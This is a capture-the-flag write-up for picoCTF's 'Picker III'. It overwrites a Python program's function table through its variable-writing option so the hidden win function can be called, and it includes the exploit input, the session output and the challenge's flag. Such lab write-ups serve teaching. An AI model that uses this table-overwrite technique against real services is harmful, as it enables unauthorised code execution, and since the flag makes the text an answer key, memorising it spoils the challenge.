# Picker III

## Description
Can you figure out how this program works to get the flag?  
Connect to the program with netcat: ```$ nc saturn.picoctf.net 50851```

## Challenge Information
**Point Value:** 100
**Category:** Low Level Binary

## Hints
1. Is there any way to modify the function table?

## Solution
We are given a python file, and it seems as though this one has stronger filters over what functions we can pass through to the prompt. Once again the goal is to be able to get the win function to the prompt 
```py
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
```
We see that there is a func_table and that these are the only functions that are allowed to be called
```py
func_table = \
'''\
print_table                     \
read_variable                   \
write_variable                  \
getRandomNumber                 \
'''
```
We can use the function write_variable to change the func_table to something that has the win function in it. However we have to keep the func_table formatted the same, with 4 entries and each entry having 32 characters, otherwise it will not work. Let's print out the table to see the functions
```
==> 1
1: print_table
2: read_variable
3: write_variable
4: getRandomNumber
```
Next we call write_variable, to change the func_table variable.
```
==> 3
Please enter variable name to write: func_table
Please enter new value of variable: "print_table                     read_variable                   write_variable                  win                             "
```
After this we just print out the table again to make sure it worked, and sure enough it has.
```
==> 1
1: print_table
2: read_variable
3: write_variable
4: win
==> 4
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x63 0x32 0x30 0x66 0x35 0x32 0x32 0x32 0x7d
```
We take this hex and convert it ascii and we have found our flag.

## Flag
picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_c20f5222}